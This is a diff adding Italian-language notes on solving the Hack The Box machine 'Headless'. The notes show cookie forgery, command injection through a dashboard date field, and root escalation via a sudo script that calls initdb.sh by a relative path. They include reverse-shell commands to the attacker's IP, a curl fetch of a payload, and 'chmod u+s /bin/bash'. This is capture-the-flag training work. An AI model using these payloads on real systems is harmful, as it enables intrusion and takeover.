@@ -1,0 +1,153 @@
+headless htb in classe
+
+porta 22 e 5000 aperta, metto -> 10.10.11.8:5000 	headless.htb su etc/hosts/ (con sudo)
+
+apro burp -> e nel form metto: e intercetto che:
+
+POST /support HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/support
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs  <- vedo che ho cookie che chiede se sono admin -> se vado su jwt.io oppure su cyberchef e metto da base64, vedo che InVzZXIi == a "user"
+Upgrade-Insecure-Requests: 1
+
+fname=3&lname=34&email=34%4034.it&phone=34&message=34
+
+
+-> posso provare a convertire da text a base64 la parola admin, per poi cambiare il cookie, ma non funziona 
+---
+
+ho provato a mettere ' nel form, ma non succede nulla, metto <script>alert("ciao");</script>
+
+e mi dà:
+
+Hacking Attempt Detected
+
+Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.
+
+Client Request Information:
+
+Method: POST
+URL: http://10.10.11.8:5000/support
+Headers: Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 251
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/support
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Upgrade-Insecure-Requests: 1
+
+
+-----
+
+faccio scan con gobuster sull'ip -> gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.8:5000
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/dashboard            (Status: 500) [Size: 265]
+/support              (Status: 200) [Size: 2363]
+Progress: 4727 / 4727 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+-> se mi connetto a 10.10.11.8:5000/dashboard mi dice ovviamente:
+
+Unauthorized
+The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn't understand how to supply the credentials required.
+
+--QUINDI DEVO OTTENERE IL COOKIE PER ESSERE ADMIN
+
+da nmap vedo che uso ->  Server: Werkzeug/2.2.2 Python/3.11.2
+
+e vedo se ha vulnerabilità, è noto che abbia una console di debug, e se è raggiungibile è vulnerabile. Quindi ora vedo se esiste una pagina /console -> ma non è trovata
+quindi cerco Werkzeug/2.2.2 cookie vulnerability
+
+
+
+
+-> ottenuto il cookie però non è nel formato giusto, vado su cyber e trovo
+
+poi il cookie è: ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 -> lo metto in storage su firefox
+
+ORA SONO SU http://10.10.11.8:5000/dashboard
+
+e vedendo da burp vedo che la data è passata come parametro:
+POST /dashboard HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/dashboard
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+Upgrade-Insecure-Requests: 1
+
+date=2023-09-15; id  <- provo a mettere un comando linux e vedo che sul repeater, mandandolo ho: uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+
+-> provo reverse shell con bash: sh -i >& /dev/tcp/10.10.14.113/9002 0>&1 e sulla mia macchina nc -lvnp 9002 --> non va
+provo a fare con un server in python 
+sulla mia macchina: python3 -m http.server 9999 mentre su burp:
+
+POST /dashboard HTTP/1.1
+Host: 10.10.11.8:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Origin: http://10.10.11.8:5000
+Connection: close
+Referer: http://10.10.11.8:5000/dashboard
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+Upgrade-Insecure-Requests: 1
+
+date=2023-09-15; curl http://10.10.14.113:9999
+
+
+e vedo che arriva la richiesta, quindi potrei far eseguire un file che creo in locale con una reverse shell dentro
+quindi creo shell.sh con dentro sh -i >& /dev/tcp/10.10.14.113/9001 0>&1   (avvio nc -lvnp 9001) e poi nella stessa cartella di dove avvio il python server devo mettere il file shell.sh
+ovviamente dovrò avere due porte differenti
+
+
+una volta avuta la shell:
+
+faccio sudo -l 
+
+e vedo che ho syscheck che posso eseguire senza password, e come se fossi root
+quindi faccio il cat del file
+
+e vedo che esegue initdb.sh, e vedo che non hanno messo il path assoluto, cioè non hanno messo il path fino a initdb.sh e quindi lui eseguirà il primo file disponibile che si chiama in quel modo
+quindi creo un file che si chiama initdb.sh e quindi faccio echo "chmod u+s /bin/bash" > initdb.sh
+
+
+
